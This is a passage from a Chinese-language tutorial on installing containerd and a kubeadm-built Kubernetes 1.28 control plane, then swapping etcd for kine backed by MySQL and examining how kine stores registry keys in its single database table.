github 上下载安装 runc，该二进制文件是静态构建的，并且应该适用于任何Linux发行版。\nwget https://github.com/opencontainers/runc/releases/download/v1.1.9/runc.amd64\rinstall -m 755 runc.amd64 /usr/local/sbin/runc\r为了通过 systemd 管理 containerd，请还需要从仓库中下载 containerd.service 单元文件\ncat \u0026lt;\u0026lt; EOF \u0026gt; /usr/lib/systemd/system/containerd.service\r[Unit]\rDescription=containerd container runtime\rDocumentation=https://containerd.io\rAfter=network.target local-fs.target\r[Service]\r#uncomment to enable the experimental sbservice (sandboxed) version of containerd/cri integration\r#Environment=\u0026quot;ENABLE_CRI_SANDBOXES=sandboxed\u0026quot;\rExecStartPre=-/sbin/modprobe overlay\rExecStart=/usr/local/bin/containerd\rType=notify\rDelegate=yes\rKillMode=process\rRestart=always\rRestartSec=5\r# Having non-zero Limit*s causes performance problems due to accounting overhead\r# in the kernel. We recommend using cgroups to do container-local accounting.\rLimitNPROC=infinity\rLimitCORE=infinity\rLimitNOFILE=infinity\r# Comment TasksMax if your systemd version does not supports it.\r# Only systemd 226 and above support this version.\rTasksMax=infinity\rOOMScoreAdjust=-999\r[Install]\rWantedBy=multi-user.target\rEOF\r配置配置文件 mkdir -p /etc/containerd \u0026amp;\u0026amp; \\\rcontainerd config default | sudo tee /etc/containerd/config.toml\r配置驱动为 systemd 将配置文件修改为实例所述\n[plugins.\u0026quot;io.containerd.grpc.v1.cri\u0026quot;.containerd.runtimes]\r[plugins.\u0026quot;io.containerd.grpc.v1.cri\u0026quot;.containerd.runtimes.runc]\rruntime_type = \u0026quot;io.containerd.runc.v2\u0026quot;\rruntime_engine = \u0026quot;\u0026quot;\rruntime_root = \u0026quot;\u0026quot;\rprivileged_without_host_devices = false\rbase_runtime_spec = \u0026quot;\u0026quot;\r[plugins.\u0026quot;io.containerd.grpc.v1.cri\u0026quot;.containerd.runtimes.runc.options]\rSystemdCgroup = true\r一键修改命令\nsed -i \u0026quot;s/SystemdCgroup = false/SystemdCgroup = true/g\u0026quot; \u0026quot;${CONTAINDERD_CONFIG_PATH}\u0026quot;\r启动服务 systemctl enable --now containerd \u0026amp;\u0026amp; \\\rsystemctl restart containerd\r使用kubeadm构建集群 加载内核依赖项 cat \u0026gt; /etc/modules-load.d/kubernetes.conf \u0026lt;\u0026lt;EOF\rip_vs\rip_vs_rr\rip_vs_wrr\rip_vs_sh\rEOF\r执行以下命令使配置立即生效:\nmodprobe ip_vs \u0026amp;\u0026amp; \\\rmodprobe ip_vs_rr \u0026amp;\u0026amp; \\\rmodprobe ip_vs_wrr \u0026amp;\u0026amp; \\\rmodprobe ip_vs_sh\r安装kubeadm kubelet kubectl 安装 kubeadm 可以参考官网的步骤来 [3]\n使用基于debian 包管理仓库 使用 Kubernetes apt 仓库\napt-get install -y apt-transport-https ca-certificates curl gpg\r下载公共签名key\ncurl -fsSL https://pkgs.k8s.io/core:/stable:/v1.28/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg\r添加适合的 k8s 版本仓库，这里是 1.28\n# This overwrites any existing configuration in /etc/apt/sources.list.d/kubernetes.list\recho 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.28/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list\r更新包索引\napt update \u0026amp;\u0026amp; \\\rapt install -y kubelet=1.28.11-1.1 kubeadm=1.28.11-1.1 kubectl=1.28.11-1.1\r不使用包管理工具 下载 kubeadm, kubelet, kubectl 二进制文件\n# 这个文件内包含的是 kubernetes 最新稳定版的版本号，如果要安装最新版可以取消掉这行注释\r# RELEASE=\u0026quot;$(curl -sSL https://dl.k8s.io/release/stable.txt)\u0026quot;\rRELEASE=\u0026quot;v1.28.11\u0026quot;\rARCH=\u0026quot;amd64\u0026quot;\rDOWNLOAD_DIR=\u0026quot;/usr/local/bin\u0026quot;\rmkdir -p \u0026quot;$DOWNLOAD_DIR\u0026quot;\rcd $DOWNLOAD_DIR\rsudo curl -L --remote-name-all https://dl.k8s.io/release/${RELEASE}/bin/linux/${ARCH}/{kubeadm,kubelet}\rsudo chmod +x {kubeadm,kubelet}\r下载 kubelet 的 system单元文件 或手动添加所需的 systemd 单元文件\n# v0.16.2 是一个固定的版本号，不是 kubernetes 版本\rRELEASE_VERSION=\u0026quot;v0.16.2\u0026quot;\rcurl -sSL \u0026quot;https://raw.githubusercontent.com/kubernetes/release/${RELEASE_VERSION}/cmd/krel/templates/latest/kubelet/kubelet.service\u0026quot; | sed \u0026quot;s:/usr/bin:${DOWNLOAD_DIR}:g\u0026quot; | sudo tee /etc/systemd/system/kubelet.service\r# kubelet.service 是一个单元文件\r# systemd 的 service.d 目录是一个固定写法，这里表示可以使用 .conf 结尾的文件来覆盖这个服务的单元文件\rmkdir -p /etc/systemd/system/kubelet.service.d\rcurl -sSL \u0026quot;https://raw.githubusercontent.com/kubernetes/release/${RELEASE_VERSION}/cmd/krel/templates/latest/kubeadm/10-kubeadm.conf\u0026quot; | sed \u0026quot;s:/usr/bin:${DOWNLOAD_DIR}:g\u0026quot; | sudo tee /etc/systemd/system/kubelet.service.d/10-kubeadm.conf\r或者手动创建 kubelet.serivce 的 systemd 的单元文件\n这个文件是将 rpm 或 dpkg 包的 kubelet.service 和上述 10-kubeadm.conf 融合为一起的，效果是相同的\ncat \u0026lt;\u0026lt; EOF \u0026gt; /usr/lib/systemd/system/kubelet.serivce\r[Unit]\rDescription=kubelet: The Kubernetes Node Agent\rDocumentation=https://kubernetes.io/docs/\rWants=network-online.target\rAfter=network-online.target\r# Note: This dropin only works with kubeadm and kubelet v1.11+\r[Service]\rEnvironment=\u0026quot;KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf\u0026quot;\rEnvironment=\u0026quot;KUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yaml\u0026quot;\r# This is a file that \u0026quot;kubeadm init\u0026quot; and \u0026quot;kubeadm join\u0026quot; generates at runtime, populating the KUBELET_KUBEADM_ARGS variable dynamically\rEnvironmentFile=-/var/lib/kubelet/kubeadm-flags.env\r# This is a file that the user can use for overrides of the kubelet args as a last resort. Preferably, the user should use\r# the .NodeRegistration.KubeletExtraArgs object in the configuration files instead. KUBELET_EXTRA_ARGS should be sourced from this file.\rEnvironmentFile=-/etc/sysconfig/kubelet\rExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS\rRestart=always\rStartLimitInterval=0\rRestartSec=10\r[Install]\rWantedBy=multi-user.target\rEOF\r离线环境镜像下载 列出所使用的镜像\n$ kubeadm config images list --kubernetes-version=1.28.8\rregistry.k8s.io/kube-apiserver:v1.28.8\rregistry.k8s.io/kube-controller-manager:v1.28.8\rregistry.k8s.io/kube-scheduler:v1.28.8\rregistry.k8s.io/kube-proxy:v1.28.8\rregistry.k8s.io/pause:3.9\rregistry.k8s.io/etcd:3.5.12-0\rregistry.k8s.io/coredns/coredns:v1.10.1\r下载对应镜像，并上传到私有仓库\nfor n in `./kubeadm config images list --kubernetes-version=1.28.11`;\rdo\rdocker pull $n; docker tag $n `echo $n | sed 's|registry.k8s.io|img.xxxx.com/system|'`\rdocker push `echo $n | sed 's|registry.k8s.io|img.xxx.com/system|'`\rdone\r生成配置文件\n./kubeadm config images list --image-repository img.xxx.com/system --kubernetes-version=v1.28.11\r# 生成对应组件的的 kubeconfig\r# kubelet\rkubeadm config print init-defaults --component-configs KubeletConfiguration|grep -A 1000 'apiVersion: kubelet.config.k8s.io'|sed 's|0s|30s|g'\r# kube-proxy\rkubeadm config print init-defaults --component-configs KubeProxyConfiguration|grep -A 1000 'kubeproxy.config.k8s.io/'|sed 's|0s|30s|g'\r使用配置文件安装\nkubeadm init --config kube.yaml -v 10\r使用命令初始化\nkubeadm init \\\r--image-repository=img.xxx.com/system \\\r--pod-network-cidr=10.10.0.0/16 \\\r--service-cidr=10.11.0.0/24 \\\r--kubernetes-version=v1.28.11 \\\r--control-plane-endpoint=`hostname -I` \\\r--apiserver-advertise-address=`hostname -I` \\\r--apiserver-cert-extra-sans=`hostname -I` \\\r--v=10\r这个时候控制平面已经可以正常工作了\n$ kubectl --kubeconfig /etc/kubernetes/admin.conf get pods -n kube-system\rNAME READY STATUS RESTARTS AGE\rcoredns-5dd5756b68-nvqwf 0/1 Pending 0 16h\rcoredns-5dd5756b68-t2tj5 0/1 Pending 0 16h\retcd-node 1/1 Running 0 16h\rkube-apiserver-node 1/1 Running 0 16h\rkube-controller-manager-node 1/1 Running 0 16h\rkube-proxy-g6fpc 1/1 Running 0 16h\rkube-scheduler-node 1/1 Running 0 16h\r使用 kine 来替换 etcd 查看官方示例 首先根据 kine 官方 example 来查看最小示例的来学习如何使用 kine [4]，通过文章得知，kine 运行有两种方式，kine 与数据库之间的使用 ssl 链接。\nmysql\nkine --endpoint \u0026quot;mysql://root:$PASSWORD@tcp(localhost:3306)/kine\u0026quot;\r--ca-file ca.crt --cert-file server.crt --key-file server.key\rpostgres\nkine --endpoint=\u0026quot;postgres://$(POSTGRES_USERNAME):$(POSTGRES_PASSWORD)@localhost:5432/postgres\u0026quot;\r--ca-file=/var/lib/postgresql/ca.crt\r--cert-file=/var/lib/postgresql/server.crt\r--key-file=/var/lib/postgresql/server.key\r这时我们需要查看一下 kine 的参数\nGLOBAL OPTIONS:\r--listen-address value (default: \u0026quot;0.0.0.0:2379\u0026quot;)\r--endpoint value Storage endpoint (default is sqlite)\r--ca-file value CA cert for DB connection\r--cert-file value Certificate for DB connection\r--server-cert-file value Certificate for etcd connection\r--server-key-file value Key file for etcd connection\r--datastore-max-idle-connections value Maximum number of idle connections retained by datastore. If value = 0, the system default will be used. If value \u0026lt; 0, idle connections will not be reused. (default: 0)\r--datastore-max-open-connections value Maximum number of open connections used by datastore. If value \u0026lt;= 0, then there is no limit (default: 0)\r--datastore-connection-max-lifetime value Maximum amount of time a connection may be reused. If value \u0026lt;= 0, then there is no limit. (default: 0s)\r--key-file value Key file for DB connection\r--metrics-bind-address value The address the metric endpoint binds to. Default :8080, set 0 to disable metrics serving. (default: \u0026quot;:8080\u0026quot;)\r--slow-sql-threshold value The duration which SQL executed longer than will be logged. Default 1s, set \u0026lt;= 0 to disable slow SQL log. (default: 1s)\r--metrics-enable-profiling Enable net/http/pprof handlers on the metrics bind address. Default is false. (default: false)\r--watch-progress-notify-interval value Interval between periodic watch progress notifications. Default is 10m. (default: 10m0s)\r--debug (default: false)\r--help, -h show help\r--version, -v print the version\r通过参数得知，上面的除了官方给出的，kine 与数据库之间的连接也可以不使用 ssl，并通过 --server-cert-file 与 --server-key-file 来作为 kube-apiserver 连接 etcd 所使用的证书指定给 kine 就可以启动了。\n编写静态文件 这里我们只需要删除 /etc/kubernetes/manifests/etcd.yaml 并将 etcd 使用的证书挂载到 kine pod 中，那么我们编写 /etc/kubernetes/manifests/kine.yaml 文件。\ncat /etc/kubernetes/manifests/kine.yaml apiVersion: v1\rkind: Pod\rmetadata:\rcreationTimestamp: null\rlabels:\rcomponent: kine\rtier: control-plane\rname: kine\rnamespace: kube-system\rspec:\rcontainers:\r- name: kine\rcommand: [ \u0026quot;/bin/sh\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;--\u0026quot; ]\rargs: [ 'kine --endpoint=\u0026quot;mysql://root:111@tcp(10.0.0.1:3306)/kine\u0026quot;\r--server-cert-file=/etc/kubernetes/pki/etcd/server.crt\r--server-key-file=/etc/kubernetes/pki/etcd/server.key' ]\rimage: docker.io/rancher/kine:v0.11.10-amd64\rimagePullPolicy: IfNotPresent\rresources:\rrequests:\rcpu: 250m\rvolumeMounts:\r- mountPath: /etc/kubernetes/pki/etcd\rname: etcd-certs\rhostNetwork: true\rvolumes:\r- hostPath:\rpath: /etc/kubernetes/pki/etcd\rtype: DirectoryOrCreate\rname: etcd-certs\rstatus: {}\rkubuadm 生成的 kubelet 的 KubeletConfiguration 文件，中静态文件得路径参数 “staticPodPath”\n$ cat /var/lib/kubelet/config.yaml\rapiVersion: kubelet.config.k8s.io/v1beta1\rkind: KubeletConfiguration\r...\rstaticPodPath: /etc/kubernetes/manifests\r这个时候可以启动 kubelet 服务，然后查看静态 Pod，此时可以看到， kube-system 名称空间 已经没有 etcd pod了\n$ kubectl --kubeconfig /etc/kubernetes/admin.conf get pod -n kube-system\rNAMESPACE NAME READY STATUS RESTARTS AGE\rkube-system kine-node 1/1 Running 0 17s\rkube-system kube-apiserver-node 1/1 Running 19 7m15s\rkube-system kube-controller-manager-node 1/1 Running 6 7m5s\rkube-system kube-scheduler-node 1/1 Running 6 7m2s\r此时就可以继续部署 k8s 的 worker 节点和 CNI 了\n探索 kine 我们可以查看数据库表结构，来探索 kine 是如何实现的 etcdAPI 转换的，我们可以看到，kine 会在启动参数中配置的库名 创建对应的数据库，并且仅有一个表 kine\nmysql\u0026gt; show databases;\r+--------------------+\r| Database |\r+--------------------+\r| information_schema |\r| kine |\r| mysql |\r| performance_schema |\r| sys |\r+--------------------+\r5 rows in set (0.01 sec)\rmysql\u0026gt; show tables;\r+----------------+\r| Tables_in_kine |\r+----------------+\r| kine |\r+----------------+\r观察表结构\nmysql\u0026gt; desc kine;\r+-----------------+---------------------+------+-----+---------+----------------+\r| Field | Type | Null | Key | Default | Extra |\r+-----------------+---------------------+------+-----+---------+----------------+\r| id | bigint(20) unsigned | NO | PRI | NULL | auto_increment |\r| name | varchar(630) | YES | MUL | NULL | |\r| created | int(11) | YES | | NULL | |\r| deleted | int(11) | YES | | NULL | |\r| create_revision | bigint(20) unsigned | YES | | NULL | |\r| prev_revision | bigint(20) unsigned | YES | MUL | NULL | |\r| lease | int(11) | YES | | NULL | |\r| value | mediumblob | YES | | NULL | |\r| old_value | mediumblob | YES | | NULL | |\r+-----------------+---------------------+------+-----+---------+----------------+\r9 rows in set (0.00 sec)\r查看数据是如何存储的\nmysql\u0026gt; select count(id),name from kine group by name;\r+-----------+---------------------------------------------------------------------------------------------+\r| count(id) | name |\r+-----------+---------------------------------------------------------------------------------------------+\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1. |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.admissionregistration.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.apiextensions.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.apps |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.authentication.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.authorization.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.autoscaling |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.batch |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.certificates.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.coordination.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.discovery.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.events.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.networking.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.node.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.policy |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.rbac.authorization.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.scheduling.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1.storage.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1beta2.flowcontrol.apiserver.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v1beta3.flowcontrol.apiserver.k8s.io |\r| 1 | /registry/apiregistration.k8s.io/apiservices/v2.autoscaling |\r| 1 | /registry/clusterrolebindings/cluster-admin |\r| 1 | /registry/clusterrolebindings/system:basic-user |\r| 1 | /registry/clusterrolebindings/system:controller:attachdetach-controller |\r| 1 | /registry/clusterrolebindings/system:controller:certificate-controller |\r| 1 | /registry/clusterrolebindings/system:controller:clusterrole-aggregation-controller |\r| 1 | /registry/clusterrolebindings/system:controller:cronjob-controller |\r| 1 | /registry/clusterrolebindings/system:controller:daemon-set-controller |\r| 1 | /registry/clusterrolebindings/system:controller:deployment-controller |\r| 1 | /registry/clusterrolebindings/system:controller:disruption-controller |\r| 1 | /registry/clusterrolebindings/system:controller:endpoint-controller |\r| 1 | /registry/clusterrolebindings/system:controller:endpointslice-controller |\r| 1 | /registry/clusterrolebindings/system:controller:endpointslicemirroring-controller |\r| 1 | /registry/clusterrolebindings/system:controller:ephemeral-volume-controller |\r| 1 | /registry/clusterrolebindings/system:controller:expand-controller |\r| 1 | /registry/clusterrolebindings/system:controller:generic-garbage-collector |\r| 1 | /registry/clusterrolebindings/system:controller:horizontal-pod-autoscaler |\r| 1 | /registry/clusterrolebindings/system:controller:job-controller |\r| 1 | /registry/clusterrolebindings/system:controller:namespace-controller |\r| 1 | /registry/clusterrolebindings/system:controller:node-controller |\r| 1 | /registry/clusterrolebindings/system:controller:persistent-volume-binder |\r| 1 | /registry/clusterrolebindings/system:controller:pod-garbage-collector |\r| 1 | /registry/clusterrolebindings/system:controller:pv-protection-controller |\r| 1 | /registry/clusterrolebindings/system:controller:pvc-protection-controller |\r| 1 | /registry/clusterrolebindings/system:controller:replicaset-controller |\r| 1 | /registry/clusterrolebindings/system:controller:replication-controller |\r| 1 | /registry/clusterrolebindings/system:controller:resourcequota-controller |\r| 1 | /registry/clusterrolebindings/system:controller:root-ca-cert-publisher |\r| 1 | /registry/clusterrolebindings/system:controller:route-controller |\r| 1 | /registry/clusterrolebindings/system:controller:service-account-controller |\r| 1 | /registry/clusterrolebindings/system:controller:service-controller |\r| 1 | /registry/clusterrolebindings/system:controller:statefulset-controller |\r| 1 | /registry/clusterrolebindings/system:controller:ttl-after-finished-controller |\r| 1 | /registry/clusterrolebindings/system:controller:ttl-controller |\r| 1 | /registry/clusterrolebindings/system:discovery |\r| 1 | /registry/clusterrolebindings/system:kube-controller-manager |\r| 1 | /registry/clusterrolebindings/system:kube-dns |\r| 1 | /registry/clusterrolebindings/system:kube-scheduler |\r| 1 | /registry/clusterrolebindings/system:monitoring |\r| 1 | /registry/clusterrolebindings/system:node |\r| 1 | /registry/clusterrolebindings/system:node-proxier |\r| 1 | /registry/clusterrolebindings/system:public-info-viewer |\r| 1 | /registry/clusterrolebindings/system:service-account-issuer-discovery |\r| 1 | /registry/clusterrolebindings/system:volume-scheduler |\r| 1 | /registry/clusterroles/admin |\r| 1 | /registry/clusterroles/cluster-admin |\r| 1 | /registry/clusterroles/edit |\r| 1 | /registry/clusterroles/system:aggregate-to-admin |\r| 1 | /registry/clusterroles/system:aggregate-to-edit |\r| 1 | /registry/clusterroles/system:aggregate-to-view |\r| 1 | /registry/clusterroles/system:auth-delegator |\r| 1 | /registry/clusterroles/system:basic-user |\r| 1 | /registry/clusterroles/system:certificates.k8s.io:certificatesigningrequests:nodeclient |\r| 1 | /registry/clusterroles/system:certificates.k8s.io:certificatesigningrequests:selfnodeclient |\r| 1 | /registry/clusterroles/system:certificates.k8s.io:kube-apiserver-client-approver |\r| 1 | /registry/clusterroles/system:certificates.k8s.io:kube-apiserver-client-kubelet-approver |\r| 1 | /registry/clusterroles/system:certificates.k8s.io:kubelet-serving-approver |\r| 1 | /registry/clusterroles/system:certificates.k8s.io:legacy-unknown-approver |\r| 1 | /registry/clusterroles/system:controller:attachdetach-controller |\r| 1 | /registry/clusterroles/system:controller:certificate-controller |\r| 1 | /registry/clusterroles/system:controller:clusterrole-aggregation-controller |\r| 1 | /registry/clusterroles/system:controller:cronjob-controller |\r| 1 | /registry/clusterroles/system:controller:daemon-set-controller |\r| 1 | /registry/clusterroles/system:controller:deployment-controller |\r| 1 | /registry/clusterroles/system:controller:disruption-controller |\r| 1 | /registry/clusterroles/system:controller:endpoint-controller |\r| 1 | /registry/clusterroles/system:controller:endpointslice-controller |\r| 1 | /registry/clusterroles/system:controller:endpointslicemirroring-controller |\r| 1 | /registry/clusterroles/system:controller:ephemeral-volume-controller |\r| 1 | /registry/clusterroles/system:controller:expand-controller |\r| 1 | /registry/clusterroles/system:controller:generic-garbage-collector |\r| 1 | /registry/clusterroles/system:controller:horizontal-pod-autoscaler |\r| 1 | /registry/clusterroles/system:controller:job-controller |\r| 1 | /registry/clusterroles/system:controller:namespace-controller |\r| 1 | /registry/clusterroles/system:controller:node-controller |\r| 1 | /registry/clusterroles/system:controller:persistent-volume-binder |\r| 1 | /registry/clusterroles/system:controller:pod-garbage-collector |\r| 1 | /registry/clusterroles/system:controller:pv-protection-controller |\r| 1 | /registry/clusterroles/system:controller:pvc-protection-controller |\r| 1 | /registry/clusterroles/system:controller:replicaset-controller |\r| 1 | /registry/clusterroles/system:controller:replication-controller |\r| 1 | /registry/clusterroles/system:controller:resourcequota-controller |\r| 1 | /registry/clusterroles/system:controller:root-ca-cert-publisher |\r| 1 | /registry/clusterroles/system:controller:route-controller |\r| 1 | /registry/clusterroles/system:controller:service-account-controller |\r| 1 | /registry/clusterroles/system:controller:service-controller |\r| 1 | /registry/clusterroles/system:controller:statefulset-controller |\r| 1 | /registry/clusterroles/system:controller:ttl-after-finished-controller |\r| 1 | /registry/clusterroles/system:controller:ttl-controller |\r| 1 | /registry/clusterroles/system:discovery |\r| 1 | /registry/clusterroles/system:heapster |\r| 1 | /registry/clusterroles/system:kube-aggregator |\r| 1 | /registry/clusterroles/system:kube-controller-manager |\r| 1 | /registry/clusterroles/system:kube-dns |\r| 1 | /registry/clusterroles/system:kube-scheduler |\r| 1 | /registry/clusterroles/system:kubelet-api-admin |\r| 1 | /registry/clusterroles/system:monitoring |\r| 1 | /registry/clusterroles/system:node |\r| 1 | /registry/clusterroles/system:node-bootstrapper |\r| 1 | /registry/clusterroles/system:node-problem-detector |\r| 1 | /registry/clusterroles/system:node-proxier |\r| 1 | /registry/clusterroles/system:persistent-volume-provisioner |\r| 1 | /registry/clusterroles/system:public-info-viewer |\r| 1 | /registry/clusterroles/system:service-account-issuer-discovery |\r| 1 | /registry/clusterroles/system:volume-scheduler |\r| 1 | /registry/clusterroles/view |\r| 1 | /registry/configmaps/default/kube-root-ca.crt |\r| 1 | /registry/configmaps/kube-node-lease/kube-root-ca.crt |\r| 1 | /registry/configmaps/kube-public/kube-root-ca.crt |\r| 1 | /registry/configmaps/kube-system/extension-apiserver-authentication |\r| 1 | /registry/configmaps/kube-system/kube-apiserver-legacy-service-account-token-tracking |\r| 1 | /registry/configmaps/kube-system/kube-root-ca.crt |\r| 1 | /registry/csinodes/node |\r| 1 | /registry/endpointslices/default/kubernetes |\r| 1 | /registry/events/default/node.17de1624f3c1624f |\r| 1 | /registry/events/default/node.17de1624f3c1e6bb |\r| 1 | /registry/events/default/node.17de1624f3c25c4f |\r| 1 | /registry/events/default/node.17de1624f5b37dfb |\r| 1 | /registry/events/default/node.17de1639e7890c71 |\r| 1 | /registry/events/default/node.17de168dce4cdb68 |\r| 1 | /registry/events/default/node.17de16a194521b80 |\r| 1 | /registry/events/kube-system/kine-node.17de162525650d9b |\r| 1 | /registry/events/kube-system/kine-node.17de1625275ca2d7 |\r| 1 | /registry/events/kube-system/kine-node.17de16252f773864 |\r| 1 | /registry/events/kube-system/kine-node.17de1625a5af90c0 |\r| 1 | /registry/events/kube-system/kine-node.17de169d120062cc |\r| 1 | /registry/events/kube-system/kine-node.17de169d1361dab8 |\r| 1 | /registry/events/kube-system/kine-node.17de169d1855aee6 |\r| 1 | /registry/events/kube-system/kine-node.17de16a1969b1ed6 |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de162513417e64 |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de1625158e863e |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de162525e8ebd2 |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de1629c37f0b35 |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de1629f6bc718f |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de162ecf004a1d |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de162eff4060dd |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de1637f005507c |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de1661f1bd6879 |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de16620f441326 |\r| 1 | /registry/events/kube-system/kube-apiserver-node.17de16a1985f63bd |\r| 1 | /registry/events/kube-system/kube-controller-manager-node.17de162511a4b3be |\r| 1 | /registry/events/kube-system/kube-controller-manager-node.17de162512f837ca |\r| 1 | /registry/events/kube-system/kube-controller-manager-node.17de16251d8b658b |\r| 1 | /registry/events/kube-system/kube-controller-manager-node.17de169b0537b6d0 |\r| 1 | /registry/events/kube-system/kube-controller-manager-node.17de16a1971f3999 |\r| 1 | /registry/events/kube-system/kube-controller-manager.17de1638e6568ffc |\r| 1 | /registry/events/kube-system/kube-controller-manager.17de168d8ed8b9cc |\r| 1 | /registry/events/kube-system/kube-controller-manager.17de16a150704739 |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de162512917b00 |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de16251515909b |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de16252295ae29 |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de162a7ee366d4 |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de169c038ba9cc |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de169cf8755bf3 |\r| 1 | /registry/events/kube-system/kube-scheduler-node.17de16a19797a620 |\r| 1 | /registry/events/kube-system/kube-scheduler.17de1643dd024555 |\r| 1 | /registry/events/kube-system/kube-scheduler.17de168dbd6f19b1 |\r| 1 | /registry/events/kube-system/kube-scheduler.17de16a24a03d6c8 |\r| 1 | /registry/flowschemas/catch-all |\r| 1 | /registry/flowschemas/endpoint-controller |\r| 1 | /registry/flowschemas/exempt |\r| 1 | /registry/flowschemas/global-default |\r| 1 | /registry/flowschemas/kube-controller-manager |\r| 1 | /registry/flowschemas/kube-scheduler |\r| 1 | /registry/flowschemas/kube-system-service-accounts |\r| 1 | /registry/flowschemas/probes |\r| 1 | /registry/flowschemas/service-accounts |\r| 1 | /registry/flowschemas/system-leader-election |\r| 1 | /registry/flowschemas/system-node-high |\r| 1 | /registry/flowschemas/system-nodes |\r| 1 | /registry/flowschemas/workload-leader-election |\r| 1 | /registry/health |\r| 97 | /registry/leases/kube-node-lease/node |\r| 97 | /registry/leases/kube-system/apiserver-6cazmjvz5glfjbabvahmi5cwfy |\r| 484 | /registry/leases/kube-system/kube-controller-manager |\r| 485 | /registry/leases/kube-system/kube-scheduler |\r| 99 | /registry/masterleases/10.0.0.14 |\r| 33 | /registry/minions/node |\r| 1 | /registry/namespaces/default |\r| 1 | /registry/namespaces/kube-node-lease |\r| 1 | /registry/namespaces/kube-public |\r| 1 | /registry/namespaces/kube-system |\r| 1 | /registry/pods/kube-system/kine-node |\r| 1 | /registry/pods/kube-system/kube-apiserver-node |\r| 1 | /registry/pods/kube-system/kube-controller-manager-node |\r| 1 | /registry/pods/kube-system/kube-scheduler-node |\r| 1 | /registry/priorityclasses/system-cluster-critical |\r| 1 | /registry/priorityclasses/system-node-critical |\r| 1 | /registry/prioritylevelconfigurations/catch-all |\r| 1 | /registry/prioritylevelconfigurations/exempt |\r| 1 | /registry/prioritylevelconfigurations/global-default |\r| 1 | /registry/prioritylevelconfigurations/leader-election |\r| 1 | /registry/prioritylevelconfigurations/node-high |\r| 1 | /registry/prioritylevelconfigurations/system |\r| 1 | /registry/prioritylevelconfigurations/workload-high |\r| 1 | /registry/prioritylevelconfigurations/workload-low |\r| 1 | /registry/ranges/serviceips |\r| 1 | /registry/ranges/servicenodeports |\r| 1 | /registry/rolebindings/kube-public/system:controller:bootstrap-signer |\r| 1 | /registry/rolebindings/kube-system/system::extension-apiserver-authentication-reader |\r| 1 | /registry/rolebindings/kube-system/system::leader-locking-kube-controller-manager |\r| 1 | /registry/rolebindings/kube-system/system::leader-locking-kube-scheduler |\r| 1 | /registry/rolebindings/kube-system/system:controller:bootstrap-signer |\r| 1 | /registry/rolebindings/kube-system/system:controller:cloud-provider |\r| 1 | /registry/rolebindings/kube-system/system:controller:token-cleaner |\r| 1 | /registry/roles/kube-public/system:controller:bootstrap-signer |\r| 1 | /registry/roles/kube-system/extension-apiserver-authentication-reader |\r| 1 | /registry/roles/kube-system/system::leader-locking-kube-controller-manager |\r| 1 | /registry/roles/kube-system/system::leader-locking-kube-scheduler |\r| 1 | /registry/roles/kube-system/system:controller:bootstrap-signer |\r| 1 | /registry/roles/kube-system/system:controller:cloud-provider |\r| 1 | /registry/roles/kube-system/system:controller:token-cleaner |\r| 1 | /registry/serviceaccounts/default/default |\r| 1 | /registry/serviceaccounts/kube-node-lease/default |\r| 1 | /registry/serviceaccounts/kube-public/default |\r| 1 | /registry/serviceaccounts/kube-system/attachdetach-controller |\r| 1 | /registry/serviceaccounts/kube-system/bootstrap-signer |\r| 1 | /registry/serviceaccounts/kube-system/certificate-controller |\r| 1 | /registry/serviceaccounts/kube-system/clusterrole-aggregation-controller |\r| 1 | /registry/serviceaccounts/kube-system/cronjob-controller |\r| 1 | /registry/serviceaccounts/kube-system/daemon-set-controller |\r| 1 | /registry/serviceaccounts/kube-system/default |\r| 1 | /registry/serviceaccounts/kube-system/deployment-controller |\r| 1 | /registry/serviceaccounts/kube-system/disruption-controller |\r| 1 | /registry/serviceaccounts/kube-system/endpoint-controller |\r| 1 | 